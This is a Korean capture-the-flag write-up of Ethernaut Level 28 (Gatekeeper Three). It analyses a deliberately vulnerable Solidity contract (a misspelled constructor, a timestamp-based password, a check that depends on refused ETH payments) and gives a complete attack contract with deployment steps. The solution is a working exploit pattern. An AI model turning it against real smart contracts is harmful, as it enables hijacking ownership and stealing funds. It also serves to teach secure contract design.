# Ethernaut Level 28 - Gatekeeper Three

## 문제 설명

세 가지 gate 조건을 모두 통과하여 `entrant`로 등록하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (target.trick() == address(this) && target.checkPassword(block.timestamp)) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;
    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;  // ← 오타! constructor가 아닌 일반 함수
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether &&
            payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree returns (bool entered) {
        entrant = tx.origin;
        return true;
    }

    receive() external payable {}
}
```

---

## 취약점 분석

### Gate 1 — construct0r 오타
`construct0r()`는 `constructor`가 아닌 일반 public 함수이다.

누구나 호출해 `owner` 탈취 가능.

중간 컨트랙트에서 호출하면:
- `msg.sender` = 공격 컨트랙트 = owner ✅
- `tx.origin` = 내 지갑 ≠ owner ✅

### Gate 2 — SimpleTrick 비밀번호
`createTrick()` 호출 시 `password = block.timestamp`로 설정된다.

→ 같은 트랜잭션(같은 블록) 내에서 `block.timestamp`로 호출하면 통과

### Gate 3 — ETH 수신 거부
- `address(this).balance > 0.001 ether` → 컨트랙트에 ETH 전송 필요
- `payable(owner).send(0.001 ether) == false` → 공격 컨트랙트가 ETH 수신 거부

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function enter() external returns (bool);
    function trick() external view returns (address);
}

contract GatekeeperThreeAttack {
    IGatekeeperThree public target;

    constructor(address payable _target) {
        target = IGatekeeperThree(_target);
    }

    function attack() public payable {
        // Gate 1: owner 탈취
        target.construct0r();

        // Gate 2: SimpleTrick 생성 및 allowEntrance 활성화
        target.createTrick();
        target.getAllowance(block.timestamp);

        // Gate 3: ETH 전송 (0.001 ether 이상)
        payable(address(target)).transfer(0.0011 ether);

        // 입장
        require(target.enter(), "Failed");
    }

    // ETH 수신 거부 → owner.send() 실패 조건 충족
    receive() external payable {
        revert();
    }
}
```

---

## 공격 단계

### Step 1 — 공격 컨트랙트 배포

```
_target : GatekeeperThree 인스턴스 주소
```

### Step 2 — attack 실행 (0.002 ETH 이상 Value 설정)

```
Value : 0.002 ETH
```

transact 클릭 후 MetaMask 승인

### Step 3 — 확인

```js
await contract.entrant()
// → 내 지갑 주소
```

---

## 핵심 교훈

- `construct0r` 오타로 생성자가 일반 함수가 됨 → 반드시 `constructor` 키워드 사용
- `block.timestamp`를 비밀번호로 사용하면 안 됨 (같은 블록 내 예측 가능)
- ETH 수신 여부로 조건을 거는 로직은 `receive()` 구현으로 조작 가능
